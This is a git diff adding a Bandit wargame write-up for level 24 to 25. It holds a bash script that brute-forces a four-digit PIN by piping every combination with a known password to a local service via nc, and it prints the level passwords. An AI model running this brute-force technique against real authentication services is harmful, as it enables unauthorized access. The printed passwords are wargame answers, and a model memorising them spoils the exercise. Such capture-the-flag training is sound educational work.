@@ -404,3 +404,33 @@ cat bandit24_pass.txt
 We change the permissions of the directory and files so that `Bandit24` will be able to execute out shellcode. Then we copy the shellcode into `/var/spool/bandit24/foo`, it executed and we get the password in `bandit24_pass.txt`.
 
 Password: `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`
+
+## Level 24 → 25
+```bash
+mktemp -d
+cd /tmp/tmp.6YQM311NSk
+nc localhost 30002
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 1234
+nano shellcode.sh
+```
+We make a new temp file to work there, and we try to connect and send a message to the server. When connected with `nc`, the server introduce itself and states the expected input. When given the wrong pin code, it responsed with `Wrong! Please enter the correct current password and pincode. Try again.`. We make a new shellcode `shellcode.sh` with that content:
+```bash
+#!/bin/bash
+
+for i in {0000..9999};
+do
+        echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8  $i >> pincodes.txt
+done
+
+cat pincodes.txt | nc localhost 30002 > response.txt
+```
+This program goes through all the possible pincodes and put them with the password in `pincodes.txt`. Then it connects to the server and sends the password and all possible pincodes. It is a **Brute Force** approach.
+
+```bash
+./shellcode.sh
+ls
+grep -v Wrong response.txt
+```
+We run the shellcode and see the files have been created. Lastly, we know that when the input is wrong, the server response starts with 'Wrong!', so we want to see all the lines that do not contain it in `responses.txt`. One of them was indeed the next password.
+
+Password: `iCi86ttT4KSNe1armKiwbQNmB3YJP3q4`
